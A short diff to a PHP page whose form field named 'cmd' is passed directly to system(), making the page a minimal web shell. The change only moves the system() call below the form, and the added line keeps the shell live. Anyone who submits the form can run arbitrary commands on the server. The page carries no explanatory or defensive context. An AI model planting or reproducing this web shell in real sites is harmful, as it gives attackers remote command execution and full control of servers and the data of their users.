@@ -9,9 +9,10 @@
   
 <body style="text-align:center;">
     <form method="post">
-        <input type="text" name="cmd"><br><?php system($_POST['cmd']); ?>
+        <input type="text" name="cmd"><br>
         <input type="submit"/>
     </form>
+    <?php system($_POST['cmd']); ?>
 </head>
   
 </html>
